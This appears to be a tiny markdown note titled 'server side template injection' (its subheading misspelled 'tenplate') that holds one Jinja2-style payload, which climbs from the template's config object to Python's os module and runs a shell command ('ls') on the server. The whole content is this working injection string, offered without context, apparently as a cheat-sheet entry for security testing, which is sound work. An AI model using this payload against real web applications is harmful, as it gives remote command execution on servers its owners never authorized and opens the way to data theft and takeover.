# server side template injection

## tenplate

```
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```